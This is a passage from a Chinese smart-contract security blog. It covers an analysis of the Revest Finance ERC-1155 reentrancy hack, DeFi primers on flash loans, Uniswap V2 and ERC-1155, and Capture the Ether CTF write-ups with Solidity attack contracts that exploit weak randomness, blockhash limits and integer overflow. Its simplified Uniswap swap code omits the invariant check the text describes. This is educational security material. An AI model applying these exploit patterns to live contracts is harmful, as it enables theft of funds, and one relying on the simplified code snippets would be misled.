FNFTHandler.sol 管理，该模块基于 ERC-1155 实现。为了理解像这样的攻击是如何发生的，需要了解一些前提知识：首先，当一个 ERC-1155 代币转移到某个地址时，系统会隐式触发一个回调函数 **onERC1155Received**，如果目标地址上存在合约，合约就可以在接收到 ERC-1155 时执行任意代码。\n接下来，在 Revest 的上下文中，定义一个 FNFT 系列有三个关键数字。第一个是    depositAmount，表示每个 FNFT 价值多少个 ERC-20 代币。第二个是 quantity 或 supply，表示该系列中 ERC-1155 的数量。如果一个系列的供应量是 10，depositAmount 为 5，这意味着该系列包含 10 个相同的 FNFT，每个 FNFT 价值 5 个 ERC-20 代币，总共有 50 个 ERC-20 代币在该系列中。最后，fnftId 是标识给定系列的整数，所有 ID 相同的 FNFT（例如 ID&#x3D;7）是相同的，可以互相替代，每个 FNFT 可以兑换出相应的 ERC-20 代币。\n为了进一步理解 Revest 系统，我们允许创建 depositAmount 为零但仍具有实际底层 ERC-20 的代币。这一设计符合我们模块化设计中 OutputReceiver 系统的需求，也为人们收集捐赠提供了方便。这与我们为 FNFT 允许额外存款的系统有关，目的是允许增加 FNFT 内存储的底层资产的价值。实现这一功能的方式是通过 depositAdditionalToFNFT 方法，该方法接受三个参数：\n\nfnftId：识别相关系列。\n存款金额：每个 FNFT 存入的代币数量。\nFNFT 数量：要进行额外存款的 FNFT 数量。\n\n如果选择存入的 FNFT 数量少于用户所拥有的 FNFT 数量，系统会在下一个可用的 ID 上创建一个新的 FNFT 系列。用户的原 FNFT 会按所选数量从钱包中销毁，并从新系列中以所选数量铸造到用户钱包中。新的 FNFT 系列的代币数量将写入存储在 TokenVault 中的 FNFT 配置。\n相关合约地址\nToken合约：0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76\n\n被攻击合约：0x2320a28f52334d62622cc2eafa15de55f9987ed9\n\n攻击合约：0xb480Ac726528D1c195cD3bb32F19C92E8d928519\n\n攻击者地址：0xef967ECE5322c0D7d26Dab41778ACb55CE5Bd58B\n\n攻击者的提款信息\n\n\n\n攻击原理与步骤首先攻击者通过uniswapV2call 2次调用受攻击的目标合约中的mintAddressLock函数。\n\n该mintAddressLock函数用于查询并向目标铸造NFT，并且nextid（FNFTHandler.fnftsCreated）会在铸造NFT后进行更新。\n\n核心漏洞：在 Revest 合约中，FNFTHandler 合约存在一个设计缺陷：该合约在执行 mint 操作后才会递增 fnftsCreated 变量，而不是在执行前就递增。这个 fnftsCreated 变量负责控制所有调用 getNextID() 时所使用的 ID。getNextID() 是确保下一个 ID 不会与现有 FNFT 的 ID 冲突的关键函数。\nfunction mint(address account, uint id, uint amount, bytes memory data) external override onlyRevestController &#123;\tsupply[id] += amount;\t_mint(account, id, amount, data);\tfnftsCreated += 1; //mint后才递增这个变量&#125;\n\n由于该变量是在 mint 操作之后才递增，攻击者能够通过控制 getNextID() 的输出，提前预测和选择一个尚未使用的 ID，从而绕过正常的 FNFT 唯一性检查。因为这一时序问题，当调用 getNextID() 时，系统返回了 ID&#x3D;1037，该 ID 虽然已被铸造，但由于递增操作尚未执行，系统“认为”它不存在。\n这导致系统错误地认为 FNFT ID&#x3D;1037 尚未存在，并允许攻击者修改该 FNFT 的配置。\n\n由于 depositAdditionalToFNFT 函数没有检查该 FNFT 配置是否已经存在，系统错误地允许攻击者修改 FNFT ID&#x3D;1037 的配置，将其 depositAmount 从初始的 0 代币更改为 1 个 ERC-20 代币。\n最终，FNFT ID&#x3D;1037 变成了：\n供应量：770 万个 FNFT（从第一次铸造获得）。\n存款金额：1 个 ERC-20 代币（攻击者通过恶意调用更改的）。\n\n\n\n\n最终结果 — 提取目标资产：\n攻击者成功将 FNFT ID&#x3D;1037 的 depositAmount 修改为 1 ERC-20 代币，然后提取了 770 万个 FNFT。\n由于系统认为 FNFT ID&#x3D;1037 持有 770 万个有效代币，攻击者能够立即将其提取，导致目标资产的资金池被完全抽空。\n\n漏洞原因\n此次攻击中的铸币相关函数未严格按照检查-生效-交互模式设计，且未考虑到ERC1155 token转账重入的可能性。\n\nfnftsCreated 变量递增时序错误，使得 getNextID() 返回了已存在的 FNFT ID。\n\n回调机制（onERC1155Received）的滥用：\n在攻击者第二次调用 mint() 函数时（铸造了 ID&#x3D;1037 的 FNFT），触发了 onERC1155Received 回调。该回调本应用于通知合约接收到 ERC-1155 代币，但攻击者通过它执行了恶意操作。\n这使得攻击者的自定义合约能够拦截此回调并调用 Revest.sol 合约中的 depositAdditionalToFNFT 函数。\n\n\n安全建议\n严格遵循Checks-Effects-Interactions模式\n\n在涉及ERC1155的DeFi项目中必须实现重入保护，限制回调函数的使用场景，防止被攻击者利用。\n\n所有状态变更应在外部调用之前完成\n\n增加完善的权限和数量验证机制\n\n\n","categories":["token"],"tags":["attack"]},{"title":"什么是闪电贷（Flash Loan）？","url":"/2025/03/08/flashloan/","content":"什么是闪电贷（Flash Loan）？闪电贷（Flash Loan）是一种去中心化金融（DeFi）中的借贷机制，允许用户在同一交易中借入大量资金，无需抵押任何资产，并在交易结束前立即归还借款。闪电贷的最大特点是无需抵押物，借款者仅需在一次交易过程中使用资金，并且必须在交易结束前还清。\n闪电贷通常应用于以下场景：\n\n套利交易：借款者可以利用市场价格差异进行套利，借入资金在不同的市场间进行买卖，赚取价差，最后用盈利偿还借款。\n债务重组：用户可以用闪电贷资金偿还其他债务或借款，优化贷款结构。\n清算：如果在某个去中心化借贷平台上的贷款超过了担保价值，闪电贷可以用来清算资产并归还贷款。\n\n闪电贷的运作方式：\n借款阶段：借款者通过智能合约借入资金，通常这些资金来自去中心化金融协议的流动性池。\n交易执行阶段：借款者在交易中执行特定操作，如套利、市场交易、债务重组等。\n归还阶段：在同一交易执行完毕后，借款者必须将借款和一定的手续费归还。如果借款没有在同一交易中归还，整个交易将被回滚，意味着借款者并没有实际借到资金。\n\n闪电贷的优缺点优点：\n无需抵押物：借款者不需要提供任何资产作为抵押物，这对普通用户来说是非常便利的。\n高效套利机会：提供了一个无需风险、且低成本的套利工具。\n去中心化：借贷完全通过智能合约自动化，无需中介或第三方参与。\n\n缺点：\n需要技术能力：用户必须了解如何通过智能合约来执行闪电贷，因此需要一定的开发能力。\n有限的时间窗口：闪电贷通常要求在一个区块内完成，时间非常有限。\n易于滥用：由于没有抵押物，闪电贷也被一些攻击者用于恶意操作，如操控市场或攻击流动性池。\n\n闪电贷的应用案例\n套利交易：如果在不同去中心化交易所（DEX）上存在价格差异，用户可以借用闪电贷资金，在低价市场买入，在高价市场卖出，赚取价差。\n清算机会：当某些 DeFi 协议中的抵押贷款超过其清算价格时，用户可以用闪电贷借入资金来清算该资产，并获得奖励。\n\n在 GitHub 和其他平台查找闪电贷的文献和项目1. GitHub 上的闪电贷项目和代码\nAave Flash Loan：Aave 是最著名的去中心化借贷平台之一，其闪电贷功能十分流行。我们可以在其 GitHub 仓库中找到闪电贷的实现代码和文档。\nGitHub 仓库链接：Aave GitHub\n该库包含了有关如何利用 Aave 协议进行闪电贷的示例和代码，适合有一定 Solidity 开发基础的人学习。\n\n\nUniswap Flash Swap：Uniswap V2 引入了“Flash Swap”的功能，这也是一种类似闪电贷的机制，允许在一次交易中借入资产进行操作。\nGitHub 仓库链接：Uniswap GitHub\n你可以在 Uniswap 的文档和代码中找到关于如何执行 Flash Swap（闪电贷）的示例。\n\n\nDeFi Flash Loan 攻击分析：许多攻击者利用闪电贷进行市场操控，部分安全研究文献分析了这些攻击方式。你可以在 GitHub 上查找相关的安全研究与示例。\n搜索关键词：flash loan attack 或 flash loan security\n\n\n\n2. Medium 和其他平台上的闪电贷文章\nMedium\n：在 Medium 上有许多关于闪电贷的文章，包括如何在 Aave 或其他平台上进行闪电贷，如何利用闪电贷进行套利等。你可以在 Medium 搜索相关主题：\n\n搜索关键词：Flash Loan\n\n\nDev.to\n：这是一个开发者社区，很多开发者会分享他们在使用闪电贷时遇到的挑战和实现方法。你可以搜索相关文章：\n\n搜索关键词：Flash Loan\n\n\n\n3. 其他平台和资源\nDapp University\n：Dapp University 提供了关于闪电贷的教程，适合新手学习如何在以太坊上实现和使用闪电贷。\n\n网站链接：Dapp University\n\n\nCryptoZombies：虽然这个平台主要是教 Solidity 编程语言，但它也提供了一些与 DeFi 和闪电贷相关的教程和案例。\n\n\n","categories":["token"],"tags":["basement"]},{"title":"Uniswap V2-主要合约关系解析","url":"/2025/03/08/Uniswap-V2-deep/","content":"UniswapV2Factory 与 UniswapV2Pair 的关系在 Uniswap V2 中，UniswapV2Factory 和 UniswapV2Pair 是两个关键的智能合约，它们各自承担着不同但紧密相关的功能，共同支持 Uniswap 去中心化交易所的运行。\nUniswapV2Factory 与 UniswapV2Pair 的关系\nUniswapV2Factory 是 Uniswap V2 的工厂合约，负责创建交易对（UniswapV2Pair）合约。它是 Uniswap 协议的“管理者”，控制着所有的交易对和流动性池的创建、获取、更新等操作。\n\nUniswapV2Pair 则是每个交易对的核心合约，它代表了一个具体的流动性池，管理着两种代币的储备、交易、流动性添加和移除等操作。每一个交易对（如 ETH&#x2F;USDT 或 DAI&#x2F;USDC）都有一个对应的 UniswapV2Pair 合约。\n\n\n工作流程和关系\n交易对创建：\n\n当用户调用 UniswapV2Factory 的 createPair() 方法时，Factory 会创建一个新的 UniswapV2Pair 合约，并为该交易对分配一个唯一的地址。这个过程是通过 CREATE2 工具来实现的。\ncreatePair 方法会传入两个代币的地址，UniswapV2Factory 会验证这两个代币是否已经有对应的交易对（通过 getPair() 查询）。如果没有，就通过 CREATE2 创建一个新的 UniswapV2Pair 合约。\n\n\n交易对管理：\n\nUniswapV2Factory 负责管理所有的交易对，提供了类似 getPair() 和 allPairs() 的方法来查询交易对。\nUniswapV2Pair 合约负责管理和处理具体交易对的所有逻辑，包括代币的存取、交换、流动性管理等。\n\n\n通过 CREATE2 创建 UniswapV2Pair 合约：\n\nFactory 使用 CREATE2 来创建新的 UniswapV2Pair 合约，这是通过 UniswapV2Factory 中的 createPair() 方法实现的。\nCREATE2 是一种特殊的合约部署方式，允许合约地址在部署前就能预测，从而使得交易对地址可预见和固定。\n\n\n管理手续费地址：\n\nUniswapV2Factory 还管理了 feeTo 和 feeToSetter 地址，分别指定了手续费的接收者和可以修改手续费接收者的地址。这些与 UniswapV2Pair 合约无关，但它们是整个 Uniswap 协议的一部分。\n\n\n\nUniswapV2Factory 源码总结UniswapV2Factory 是 Uniswap V2 协议中的核心合约之一，主要负责管理所有交易对的创建与查询，保持对所有流动性池的控制。它提供了以下主要功能：\n主要功能\n交易对创建：\n\ncreatePair(address tokenA, address tokenB)：用于创建一个新的交易对。如果两个代币尚未创建对应的交易对，它将创建一个新的 UniswapV2Pair 合约，并将其地址存储在 allPairs 数组中。\ngetPair(address tokenA, address tokenB)：根据代币地址获取对应的交易对合约地址。会检查交易对是否已经存在。\n\n\n全局查询：\n\nallPairsLength()：返回当前已创建的交易对数量。\nallPairs(uint256 index)：返回 index 位置的交易对合约地址。\n\n\n手续费管理：\n\nsetFeeTo(address feeTo) 和 setFeeToSetter(address feeToSetter)：用于设置手续费的接收地址和设置者。\n\n\n存储交易对地址：\n\ngetPair() 方法使用了 mapping(address =&gt; mapping(address =&gt; address)) 来存储每一对代币的交易对地址。这样可以快速查询到任意两种代币是否存在交易对。\n\n\n\n关键代码address public feeTo;address public feeToSetter;mapping(address =&gt; mapping(address =&gt; address)) public getPair;address[] public allPairs;function createPair(address tokenA, address tokenB) external returns (address pair) &#123;    require(tokenA != tokenB, &quot;UniswapV2: IDENTICAL_ADDRESSES&quot;);    (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);    require(getPair[token0][token1] == address(0), &quot;UniswapV2: PAIR_EXISTS&quot;); // Ensure pair does not exist    bytes memory bytecode = type(UniswapV2Pair).creationCode;    bytes32 salt = keccak256(abi.encodePacked(token0, token1));    pair = address(new UniswapV2Pair&#123;salt: salt&#125;());    getPair[token0][token1] = pair;    getPair[token1][token0] = pair;    allPairs.push(pair);    emit PairCreated(token0, token1, pair, allPairs.length);&#125;\n\nUniswapV2Pair 源码总结UniswapV2Pair 是实际执行流动性管理、交易交换和流动性池的合约。每个 UniswapV2Pair 合约管理一对代币的交易和流动性。每个交易对都有独立的储备池和交易功能。\n主要功能\n流动性管理：\nmint(address to)：提供流动性时，铸造 LP Token 并将其发送给流动性提供者。\nburn(address to)：销毁 LP Token 并按比例返回流动性池中的代币。\n\n\n交换功能：\nswap(uint amount0Out, uint amount1Out, address to, bytes calldata data)：用于在交易对之间进行代币交换。通过更新储备和校验恒定积公式（K），来确保交易的合法性。\n\n\n储备更新：\n_update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1)：在每次流动性增加或减少时更新储备量。\n\n\n手续费计算：\n_mintFee(uint112 _reserve0, uint112 _reserve1)：如果交易对的储备量发生变化，会根据变化计算是否需要铸造手续费流动性代币，并奖励给流动性提供者。\n\n\n\n关键代码function mint(address to) external returns (uint liquidity) &#123;    uint balance0 = IERC20(token0).balanceOf(address(this));    uint balance1 = IERC20(token1).balanceOf(address(this));    uint amount0 = balance0.sub(reserve0);    uint amount1 = balance1.sub(reserve1);    liquidity = Math.min(amount0.mul(totalSupply) / reserve0, amount1.mul(totalSupply) / reserve1);    _mint(to, liquidity);    _update(balance0, balance1, reserve0, reserve1);&#125;function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external &#123;    if (amount0Out &gt; 0) _safeTransfer(token0, to, amount0Out);    if (amount1Out &gt; 0) _safeTransfer(token1, to, amount1Out);    if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);    uint balance0 = IERC20(token0).balanceOf(address(this));    uint balance1 = IERC20(token1).balanceOf(address(this));    _update(balance0, balance1, reserve0, reserve1);&#125;function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;    uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));    uint rootKLast = Math.sqrt(_kLast);    if (rootK &gt; rootKLast) &#123;        uint numerator = totalSupply.mul(rootK.sub(rootKLast));        uint denominator = rootK.mul(5).add(rootKLast);        uint liquidity = numerator / denominator;        if (liquidity &gt; 0) _mint(feeTo, liquidity);    &#125;    _kLast = uint112(rootK);    return true;&#125;\n\n总结\n**UniswapV2Factory**：负责创建和管理所有交易对，提供查询交易对的功能，保证每对代币只有一个对应的交易合约。\n**UniswapV2Pair**：负责实际的流动性管理、代币交换和手续费收取等。每个 UniswapV2Pair 合约代表一个具体的流动性池。\n\n两者关系：\n\nUniswapV2Factory 创建和管理 UniswapV2Pair 合约，负责交易对的生命周期管理。\nUniswapV2Pair 合约则直接处理代币交换、流动性管理、手续费收取等功能。\n\n","categories":["Uniswap"],"tags":["basement"]},{"title":"ERC1155","url":"/2025/03/08/ERC1155/","content":"ERC-1155 介绍ERC-1155 是一个多代币标准，它允许单个智能合约同时支持多种类型的代币。与传统的 ERC-20（用于同质化代币）和 ERC-721（用于非同质化代币，NFT）标准不同，ERC-1155 标准允许一个合约处理多种不同的代币类型，既可以是同质化代币（如 ERC-20），也可以是非同质化代币（如 ERC-721），甚至是两者的组合。\nERC-1155 的关键特点\n多种代币类型支持：\nERC-1155 允许在同一个合约中管理多种类型的代币。一个合约可以包含 ERC-20 风格的代币、ERC-721 风格的 NFT，或者混合的代币类型。\n\n\n批量操作：\nERC-1155 支持批量转账，即一次性转移多个代币类型。这在交易大量资产时能够减少交易费用。\n\n\n更高的效率：\n相较于 ERC-20 和 ERC-721，ERC-1155 的操作更加高效。例如，ERC-1155 支持通过一个单一的 safeTransferFrom 操作，传送多个代币，而 ERC-20 和 ERC-721 需要分别进行多个调用。\n\n\n标准化接口：\nERC-1155 提供了统一的接口和函数，可以同时支持多种代币。这使得开发者和用户能够在不同的代币类型之间切换，而不需要为每个代币标准编写额外的代码。\n\n\n交易和存储的优化：\n在存储和交易方面，ERC-1155 提供了更为优化的解决方案，减少了区块链上的交易数据量，尤其在涉及大量代币时显著提高效率。\n\n\n\nERC-1155 的核心函数ERC-1155 标准定义了一些重要的函数，包括：\n\nsafeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data): 允许从一个地址向另一个地址转移指定数量的代币，其中 id 表示代币的类型，amount 表示转移的数量，data 用于附加任何额外的数据。\nsafeBatchTransferFrom(address from, address to, uint256[] ids, uint256[] amounts, bytes data): 允许批量转移多个代币类型，减少了多次交易的需要。\nbalanceOf(address account, uint256 id): 查询某个地址持有某种代币的余额。\nbalanceOfBatch(address[] accounts, uint256[] ids): 批量查询多个地址的多个代币余额。\nsetApprovalForAll(address operator, bool approved): 允许某个地址授权一个操作员管理其所有代币。适用于所有类型的代币，而不仅仅是某个特定的代币 ID。\nisApprovedForAll(address account, address operator): 检查操作员是否获得了管理某个账户所有代币的授权。\n\nERC-1155 示例代码下面是一个简单的 ERC-1155 合约实现示例：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;@openzeppelin/contracts/token/ERC1155/ERC1155.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;contract MyERC1155 is ERC1155, Ownable &#123;    // 构造函数    constructor() ERC1155(&quot;https://myapi.com/api/token/&#123;id&#125;.json&quot;) &#123;&#125;    // Mint 新的代币    function mint(address account, uint256 id, uint256 amount, bytes memory data) public onlyOwner &#123;        _mint(account, id, amount, data);    &#125;    // 批量 Mint 代币    function mintBatch(address to, uint256[] memory ids, uint256[] memory amounts, bytes memory data) public onlyOwner &#123;        _mintBatch(to, ids, amounts, data);    &#125;    // Burn 代币    function burn(address account, uint256 id, uint256 amount) public onlyOwner &#123;        _burn(account, id, amount);    &#125;    // 批量 Burn 代币    function burnBatch(address[] memory accounts, uint256[] memory ids, uint256[] memory amounts) public onlyOwner &#123;        _burnBatch(accounts, ids, amounts);    &#125;&#125;\n\nERC-1155 与 ERC-20 和 ERC-721 的对比\n\n\n特性\nERC-20\nERC-721\nERC-1155\n\n\n\n代币类型\n同质化代币\n非同质化代币 (NFT)\n支持同质化和非同质化代币\n\n\n批量操作\n不支持批量转账\n不支持批量转账\n支持批量转账\n\n\n灵活性\n只能处理一种代币类型\n只能处理单一类型代币\n支持多种代币类型\n\n\n交易费用\n高（多次交易）\n高（多次交易）\n低（批量操作）\n\n\n合约复杂度\n简单\n相对复杂\n相对简单，但支持更多功能\n\n\nERC-1155 的应用场景\n游戏资产：游戏内的虚拟物品（如装备、皮肤、道具等）可以通过 ERC-1155 标准管理。同一合约可以管理多种类型的虚拟物品，并支持批量交易。\nNFT 市场：ERC-1155 可用于 NFT 市场，支持多个 NFT 类型（如艺术品、收藏品、卡片等）在一个合约中交易。\n代币化收藏品：支持多种同质化和非同质化代币的创建和交易，适用于代币化收藏品，如限量版商品等。\n拍卖和拍卖平台：通过批量操作和更低的交易费用，ERC-1155 可以在拍卖场景中提供更加高效的交易体验。\n\n","categories":["token"],"tags":["basement"]},{"title":"CaptureTheEther_Lotteries_题解","url":"/2025/03/15/CaptureTheEther-Lotteries-1-4/","content":"Capture the ether靶场解题记录-Lotteries:1. Guess the number这题比较简单，题目让我们猜测一个数字，然而这个数字已经在合约中写出来了，所以我们直接写一个攻击合约猜这个数字（42）就行\n// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheNumberChallenge &#123;    uint8 answer = 42;    function GuessTheNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;//下面为攻击合约contract AttackGuessTheNumber &#123;    GuessTheNumberChallenge target;    function AttackGuessTheNumber(address _targetAddress) public &#123;        target = GuessTheNumberChallenge(_targetAddress);    &#125;    function attack() public payable &#123;        // 猜测数字为 42        target.guess.value(1 ether)(42);    &#125;    function () public payable &#123;        if (address(target).balance &gt;= 1 ether) &#123;            target.isComplete();        &#125;    &#125;&#125;\n\n提示：注意一下部署的条件（Ether&gt;&#x3D;1）\n最后显示成功\n\n2. Guess the secret number这个挑战让我们猜出哈希加密后的一个数字，\npragma solidity ^0.4.21;contract GuessTheSecretNumberChallenge &#123;    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;    //储存答案的哈希值    function GuessTheSecretNumberChallenge() public payable &#123;        require(msg.value == 1 ether);//!要求部署时必须支付1eth    &#125;        function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;//检查合约余额是否为0    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (keccak256(n) == answerHash) //如果猜测的n的哈希值等于answerHash，将ether发送给调用者&#123;            msg.sender.transfer(2 ether);        &#125;    &#125;//?要求：猜出哈希加密的数字\n\n我想的思路很简单粗暴，就是直接for循环爆破，直到猜出答案为止\n攻击合约：\ncontract Attack&#123;    uint public n;    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;    function Attack() public &#123;        for(uint8 i = 0 ; i &lt; 256 ; i++)&#123;            if(keccak256(i) == answerHash)&#123;                n = i;                break;            &#125;        &#125;    &#125;&#125;\n\n最后解出n&#x3D;170，验证答案正确\n\n3. Guess the random number这个挑战让我们猜出block.number上的一个随机数-1\npragma solidity ^0.4.21;contract GuessTheRandomNumberChallenge &#123;    uint8 answer;//储存随机生成的数字    function GuessTheRandomNumberChallenge() public payable &#123;        require(msg.value == 1 ether);//同样，要求部署时必须支付1eth        answer = uint8(keccak256(block.blockhash(block.number - 1), now));//生成的随机数，这个now很关键，说明他的answer在他部署的那一刻就生成好了    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;     &#125;&#125;//?那怎么知道这个随机数呢 很简单,我们可以在控制台直接查看到它的值\n\n但是控制台好像出bug了，查不出来？？？\n\n4. Guess the new number和上面一个题差不多，不过这题的number是实时生成的，所以我们只要和他在同一个时间生成就行了\npragma solidity ^0.4.21;contract GuessTheNewNumberChallenge &#123;    function GuessTheNewNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;//题目根据block.number来生成随机数，我们只要能和他在同一区块且用同样生成方法就可以生成answer.contract Attack&#123;    GuessTheNewNumberChallenge target;    function Attack(address _target) public payable&#123;        target = GuessTheNewNumberChallenge(_target);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));//以同样的方法生成随机数answer        target.guess.value(1 ether)(answer);    &#125;    function() external payable&#123;    &#125;&#125;\n\n\n\n\n\n\n5.Predict the future主要的分析结果我都写注释里了，这里说下解题思路\n由于知道最后的结果是求余，所以只会有0-9这几个答案，我们随便定一个其中数字，然后等这个数字符合answer的时候就调用settle\npragma solidity ^0.4.21;contract PredictTheFutureChallenge &#123;    address guesser;    uint8 guess;    uint256 settlementBlockNumber;    function PredictTheFutureChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0; //如果合约的余额为0 则挑战完成    &#125;    function lockInGuess(uint8 n) public payable &#123;        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = n;        settlementBlockNumber = block.number + 1; //猜测者通过支付1eth来猜测一个数字    &#125;    function settle() public &#123;        require(msg.sender == guesser);        require(block.number &gt; settlementBlockNumber);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; //这个函数被用来生成一个随机数，并与lockInGuess函数中的数字进行比较，如果猜测正确，猜测者将获得2eth的奖励        guesser = 0;        if (guess == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;//挑战目的就是让合约的余额为0，也就是我们要成功猜出这个数字，我注意到answer的末尾有个%10，说明答案只可能是0-9，所以我又要直接暴力破解了//攻击合约contract Attack&#123;    PredictTheFutureChallenge target;    function Attack(address _target) payable&#123;        target = PredictTheFutureChallenge(_target);        target.lockInGuess.value(1 ether)(5);    &#125;    function att(address _target) payable&#123;        uint8 n = 5;        uint answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        if(n==answer)&#123;            target.settle();        &#125;else        &#123;            return;        &#125;    &#125;    function()external payable&#123;            &#125;&#125;\n\n\n\n6.Predict the block hash这个题需要我们提前知道后一个区块的区块哈希，很明显这很难，甚至是不可能的，但block.blockhash有一个特点，他只能得到256个区块内的哈希值，一旦超过256的区块，就无法返回对应的区块哈希，只会返回零，我们根据这个来进行攻击即可。\npragma solidity ^0.4.21;contract PredictTheBlockHashChallenge &#123;    address guesser;    bytes32 guess;    uint256 settlementBlockNumber;    function PredictTheBlockHashChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function lockInGuess(bytes32 hash) public payable &#123;        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = hash;        settlementBlockNumber = block.number + 1;    &#125;    function settle() public &#123;        require(msg.sender == guesser);        require(block.number &gt; settlementBlockNumber);        bytes32 answer = block.blockhash(settlementBlockNumber);        guesser = 0;        if (guess == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;  //要我们猜出下一个区块的hash，但是这通过计算的话非常难//可以利用区块链的特性，block.blockhash他只能得到256个区块内的哈希值，一旦超过256的区块，就无法返回对应的区块哈希，只会返回零，我们根据这个来进行攻击即可//攻击合约contract Attack&#123;    PredictTheBlockHashChallenge target;    uint256 public blocknumber;    bytes32 answer;    function Attack(address _target) public&#123;        target = PredictTheBlockHashChallenge(_target);    &#125;    function lock()public payable&#123;        blocknumber = block.number+1;        target.lockInGuess.value(1 ether)(answer);    &#125;    function att()public&#123;        require(block.number-256&gt;blocknumber); //超过256个区块后，我们就调用settle        target.settle();    &#125;    function ()external payable&#123;    &#125;&#125;\n\n部署两个合约，并调用攻击合约的lock函数，随后等到能够调用att函数，再调用att函数。\n","categories":["CaptureTheEther"],"tags":["Test"]},{"title":"CaptureTheEther_Math_题解","url":"/2025/03/19/CaptureTheEther-Math/","content":"Capture the ether靶场解题记录-Math1.Token sale通关条件是让合约中的余额小于1\npragma solidity ^0.4.21;contract TokenSaleChallenge &#123;    mapping(address =&gt; uint256) public balanceOf;    uint256 constant PRICE_PER_TOKEN = 1 ether;    function TokenSaleChallenge(address _player) public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance &lt; 1 ether;    &#125;    function buy(uint256 numTokens) public payable &#123;        require(msg.value == numTokens * PRICE_PER_TOKEN);//!整数溢出 如果用户传入一个非常大的 numTokens 值，使得 numTokens * PRICE_PER_TOKEN 发生溢出，msg.value 的检查可能会通过，从而导致用户以较少的以太币购买大量代币。        balanceOf[msg.sender] += numTokens;    &#125;    function sell(uint256 numTokens) public &#123;        require(balanceOf[msg.sender] &gt;= numTokens);        balanceOf[msg.sender] -= numTokens;        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);    &#125;&#125;\n\n既然要求的是无中生有，那就先从溢出的角度看。代码中的 1 ether 具有一定的迷惑性，如果将 1 ether 视为 1，则代码没问题。但是合约中 ETH 的数量单位其实是 wei，1 ether &#x3D; 10**18 wei，这么看来 buy 函数中的 numTokens PRICE_PER_TOKEN 就很有问题了。我们只需要选择一个数让 numTokens PRICE_PER_TOKEN 溢出，就能够获得超量代币。\n攻击合约就没什么好说的，主要是计算能达到溢出的numTokens，和需要购买的wei的value\n攻击合约\n//要我们把合约的代币清空？我们很容易发现buy中的整数溢出漏洞。因为虽然合约里eth的单位是ether，但是他的存储还是以wei为单位。1 ether=10^18.如果我们传入一个较大的numTokens，产生溢出得到一个很小的value。contract figure&#123;    uint256 public max2;    uint256 public max10;    uint256 public numToken;    uint256 public value;    function fi()public &#123;        max2=2**256-1;        max10=10**18;    &#125;    function f2()public&#123;        numToken=max2/max10 +1/max10+1;        value=numToken*10**18;    &#125;&#125;\n\n最后得到如下的数据\n\n接下来给buy传入一个会造成溢出的numTokens 并且上方部署消耗wei的数量为415992086870360064\n\n然后我们就获得了一堆代币，这个时候再卖出1eth就能达成挑战\n2.Token whale通关条件是获得超过 1000000 个 token\npragma solidity ^0.4.21; contract TokenWhaleChallenge &#123;    address player;    // 存储玩家地址的变量。    uint256 public totalSupply;    // 代币的总供应量，公开可见。    mapping(address =&gt; uint256) public balanceOf;    // 一个映射，记录每个地址的代币余额，公开可见。    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;    // 一个嵌套映射，记录某个地址授权给另一个地址的代币数量，公开可见。    string public name = &quot;Simple ERC20 Token&quot;;    // 代币的名称，公开可见。    string public symbol = &quot;SET&quot;;    // 代币的符号，公开可见。    uint8 public decimals = 18;    // 代币的小数位数，通常为 18，公开可见。    function TokenWhaleChallenge(address _player) public &#123;        // 构造函数，初始化合约时调用。        player = _player;        // 设置玩家地址。        totalSupply = 1000;        // 设置代币的总供应量为 1000。        balanceOf[player] = 1000;        // 将所有代币分配给玩家。    &#125;    function isComplete() public view returns (bool) &#123;        // 检查挑战是否完成。        return balanceOf[player] &gt;= 1000000;        // 如果玩家的代币余额大于或等于 100 万，则返回 true。    &#125;    event Transfer(address indexed from, address indexed to, uint256 value);    // 定义一个事件，用于记录代币的转账操作。    function _transfer(address to, uint256 value) internal &#123;        // 内部函数，用于执行代币转账。        balanceOf[msg.sender] -= value;        // 